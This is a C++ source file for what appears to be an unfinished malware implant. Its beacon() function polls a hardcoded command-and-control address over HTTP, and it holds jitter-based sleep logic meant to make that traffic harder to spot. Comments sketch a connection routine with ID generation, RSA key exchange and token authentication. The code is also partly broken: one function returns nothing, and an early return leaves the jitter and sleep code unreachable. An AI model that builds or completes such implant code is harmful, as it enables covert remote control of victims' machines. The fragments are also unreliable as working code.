#include "implant.h"
#include "xhttp.h"
#include <chrono>
#include <thread>
#include <random>
#include <stdexcept>
#include <iostream>
#include "xcore.h"

namespace implant {

/* std::string initConnection() {
    // Generate ID
    // Make GET connection with a parameter named ID: 
    // Receive public RSA key
    // Authenticate
    // Receive token
    // set isRunning to true
}
*/

std::string initConnection() {
    xcore::generateID();
    
}

bool isRunning = true;

std::string beacon() {
    while (isRunning) {
        try {
            std::string url = "http://192.168.1.147:8443/home";
            std::cerr << url << std::endl;
            std::string response = xhttp::http_get(url);
            std::cerr << response << std::endl;
            return response;
            // Define base wait time and max jitter
            const int baseWaitTime = 250; // 1/4 second
            const double maxJitter = 0.3 * baseWaitTime; // 30% of base wait time
            // Seed the random number generator
            std::random_device rd;
            std::mt19937 gen(rd());
            std::uniform_real_distribution<> distrib(-maxJitter, maxJitter);
            // Generate a random jitter value
            double jitter = distrib(gen);

            // Calculate the final wait time with jitter
            int waitTimeWithJitter = baseWaitTime + static_cast<int>(jitter);
            // Output the wait time with jitter
            std::cout << "Wait time with jitter: " << waitTimeWithJitter << " milliseconds" << std::endl;

            // Sleep for the calculated time
            std::this_thread::sleep_for(std::chrono::milliseconds(waitTimeWithJitter));

        }
        catch (const std::exception& e) {
            printf("\nBeaconing error: %s\n", e.what());
            // Try beacon again.
            // If failed 5 times go to onFail()
        }
    }
    // Return a message indicating that the beacon loop exited
    return "Exited beacon loop";
}


}